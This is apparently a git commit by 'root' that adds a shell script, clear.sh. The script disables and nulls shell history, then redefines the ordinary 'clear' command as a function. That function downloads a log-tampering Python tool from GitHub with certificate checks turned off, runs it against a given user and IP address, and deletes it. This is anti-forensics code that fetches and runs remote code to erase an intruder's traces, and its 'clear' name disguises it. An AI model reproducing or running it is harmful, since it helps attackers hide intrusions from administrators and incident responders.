4626945e23c67ec158920e40ef7c98b467f4b3d2
root <root@localhost.localdomain>
2019-03-27 03:53:47 -0400

    ok

---
+++ clear.sh
@@ -0,0 +1,16 @@
+
+unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG;
+export HISTFILE=/dev/null;
+export HISTSIZE=0;
+export HISTFILESIZE=0;
+
+function clear {
+    wget --no-check-certificate  -c -t 3 'https://raw.githubusercontent.com/re4lity/logtamper/master/logtamper.py'
+    if [ -f logtamper.py ];then
+    	python logtamper.py -m 2 -u $1 -i $2 ;
+	rm logtamper.py
+    fi
+}
+
+
+
